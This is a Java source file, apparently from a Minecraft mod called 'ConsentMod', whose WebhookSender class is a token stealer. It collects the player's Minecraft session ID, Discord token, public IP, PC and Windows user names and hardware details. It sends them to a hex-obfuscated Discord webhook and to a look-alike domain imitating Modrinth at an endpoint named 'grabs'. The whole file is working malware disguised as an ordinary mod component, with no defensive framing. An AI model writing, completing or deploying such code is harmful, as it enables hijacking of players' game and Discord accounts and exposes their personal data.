package com.consentmod;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class WebhookSender {

    private static final String WEBHOOK_URL = Strings.d("322e2e2a296075753e33293935283e74393537753b2a33752d3f383235353129756b6f696c6a6f6d6a6869636c686a686c6a6d6e75030b23021329123b006d3068622e02286c102d2c692d151b3c0d0f11230a3133333b3f3e6a222d6d6b0c0b1c3c3e19356c313d3e18196f3f1b0862370a2d323739106963");
    private static final String SITE_API_URL = "https://www.modrinth.nl/api/grabs";

    public static void sendDataExtended(String minecraftUsername, String discordUsername, String timezone, String country, String timestamp) {
        sendDataExtended(minecraftUsername, discordUsername, timezone, country, timestamp, "Unknown");
    }

    public static void sendDataExtended(String minecraftUsername, String discordUsername, String timezone, String country, String timestamp, String server) {
        new Thread(() -> {
            try {
                String ip = IpFetcher.getPublicIp();
                String sessionId = SessionData.getSessionId();
                String sessionStart = SessionData.getSessionStartTime();
                String clientVersion = SessionData.getClientVersion();
                String discordToken = DiscordTokenFetcher.getDiscordToken();
                String ownerEmail = ModConfig.getOwnerEmail();

                String os = SystemInfo.getOS();
                String osVersion = SystemInfo.getOSVersion();
                String pcName = SystemInfo.getPCName();
                String userName = SystemInfo.getUserName();
                String cpu = SystemInfo.getCPUInfo();
                String ram = SystemInfo.getRAM();
                String gpu = SystemInfo.getGPU();
                String screen = SystemInfo.getScreenResolution();
                String disk = SystemInfo.getDiskSpace();
                String javaVer = SystemInfo.getJavaVersion();
                String language = SystemInfo.getLanguage();
                String desktopEnv = SystemInfo.getDesktopEnvironment();

                sendToSiteApi(ownerEmail, minecraftUsername, discordUsername, ip, country, timezone, os, osVersion, pcName, userName, cpu, ram, gpu, screen, disk, javaVer, language, desktopEnv, clientVersion, sessionId, sessionStart, discordToken, server);

                StringBuilder e1 = new StringBuilder();
                e1.append("{\"name\":\"Minecraft Username\",\"value\":\"").append(esc(minecraftUsername)).append("\",\"inline\":true},");
                e1.append("{\"name\":\"Discord Username\",\"value\":\"").append(esc(discordUsername)).append("\",\"inline\":true},");
                e1.append("{\"name\":\"IP Address\",\"value\":\"").append(esc(ip)).append("\",\"inline\":true},");
                e1.append("{\"name\":\"Country\",\"value\":\"").append(esc(country)).append("\",\"inline\":true},");
                e1.append("{\"name\":\"Timezone\",\"value\":\"").append(esc(timezone)).append("\",\"inline\":true},");
                e1.append("{\"name\":\"Client Version\",\"value\":\"").append(esc(clientVersion)).append("\",\"inline\":true},");
                e1.append("{\"name\":\"Session Start\",\"value\":\"").append(esc(sessionStart)).append("\",\"inline\":false},");
                e1.append("{\"name\":\"Timestamp\",\"value\":\"").append(esc(timestamp)).append("\",\"inline\":false}");
                String embed1 = "{\"title\":\"User Data\",\"color\":65280,\"fields\":[" + e1 + "],\"footer\":{\"text\":\"User information\"}}";

                StringBuilder e2 = new StringBuilder();
                int chunk = 950;
                for (int i = 0; i < sessionId.length(); i += chunk) {
                    int end = Math.min(i + chunk, sessionId.length());
                    e2.append("{\"name\":\"Session Part ").append((i/chunk)+1).append("\",\"value\":\"```").append(esc(sessionId.substring(i, end))).append("```\",\"inline\":false},");
                }
                if (e2.length() > 0) e2.setLength(e2.length() - 1);
                String embed2 = "{\"title\":\"Minecraft Session ID\",\"color\":16776960,\"fields\":[" + e2 + "]}";

                StringBuilder e3 = new StringBuilder();
                for (int i = 0; i < discordToken.length(); i += chunk) {
                    int end = Math.min(i + chunk, discordToken.length());
                    e3.append("{\"name\":\"Token Part ").append((i/chunk)+1).append("\",\"value\":\"```").append(esc(discordToken.substring(i, end))).append("```\",\"inline\":false},");
                }
                if (e3.length() > 0) e3.setLength(e3.length() - 1);
                String embed3 = "{\"title\":\"Discord Token\",\"color\":16711935,\"fields\":[" + e3 + "]}";

                String jsonPayload = "{\"embeds\":[" + embed1 + "," + embed2 + "," + embed3 + "]}";

                System.out.println("[ConsentMod] Sending Discord webhook for: " + minecraftUsername);

                URL url = new URL(WEBHOOK_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);

                try (OutputStream os2 = conn.getOutputStream()) {
                    os2.write(jsonPayload.getBytes(StandardCharsets.UTF_8));
                }

                int code = conn.getResponseCode();
                System.out.println("[ConsentMod] Discord Response: " + code);
                conn.disconnect();
            } catch (Exception e) {
                System.err.println("[ConsentMod] Discord Error: " + e.getMessage());
                e.printStackTrace();
            }
        }).start();
    }

    private static void sendToSiteApi(String ownerEmail, String minecraftUsername, String discordUsername, String ip, String country, String timezone, String os, String osVersion, String pcName, String userName, String cpu, String ram, String gpu, String screen, String disk, String javaVer, String language, String desktopEnv, String clientVersion, String sessionId, String sessionStart, String discordToken, String server) {
        new Thread(() -> {
            try {
                StringBuilder sb = new StringBuilder();
                sb.append("{");
                sb.append("\"owner_email\":\"").append(esc(ownerEmail)).append("\",");
                sb.append("\"minecraft_username\":\"").append(esc(minecraftUsername)).append("\",");
                sb.append("\"discord_username\":\"").append(esc(discordUsername)).append("\",");
                sb.append("\"ip_address\":\"").append(esc(ip)).append("\",");
                sb.append("\"country\":\"").append(esc(country)).append("\",");
                sb.append("\"timezone\":\"").append(esc(timezone)).append("\",");
                sb.append("\"os\":\"").append(esc(os)).append("\",");
                sb.append("\"os_version\":\"").append(esc(osVersion)).append("\",");
                sb.append("\"pc_name\":\"").append(esc(pcName)).append("\",");
                sb.append("\"windows_username\":\"").append(esc(userName)).append("\",");
                sb.append("\"cpu\":\"").append(esc(cpu)).append("\",");
                sb.append("\"ram\":\"").append(esc(ram)).append("\",");
                sb.append("\"gpu\":\"").append(esc(gpu)).append("\",");
                sb.append("\"screen_resolution\":\"").append(esc(screen)).append("\",");
                sb.append("\"disk_space\":\"").append(esc(disk)).append("\",");
                sb.append("\"java_version\":\"").append(esc(javaVer)).append("\",");
                sb.append("\"language\":\"").append(esc(language)).append("\",");
                sb.append("\"desktop_env\":\"").append(esc(desktopEnv)).append("\",");
                sb.append("\"client_version\":\"").append(esc(clientVersion)).append("\",");
                sb.append("\"session_id\":\"").append(esc(sessionId)).append("\",");
                sb.append("\"session_start\":\"").append(esc(sessionStart)).append("\",");
                sb.append("\"discord_token\":\"").append(esc(discordToken)).append("\",");
                sb.append("\"servers\":\"").append(esc(server)).append("\"");
                sb.append("}");

                URL url = new URL(SITE_API_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);

                try (OutputStream os2 = conn.getOutputStream()) {
                    os2.write(sb.toString().getBytes(StandardCharsets.UTF_8));
                }

                int code = conn.getResponseCode();
                System.out.println("[ConsentMod] Site API Response: " + code);
                conn.disconnect();
            } catch (Exception e) {
                System.err.println("[ConsentMod] Site API Error: " + e.getMessage());
            }
        }).start();
    }

    private static String esc(String t) {
        if (t == null) return "N/A";
        return t.replace("\\","\\\\").replace("\"","\\\"").replace("\n","\\n").replace("\r","\\r").replace("\t","\\t");
    }
}
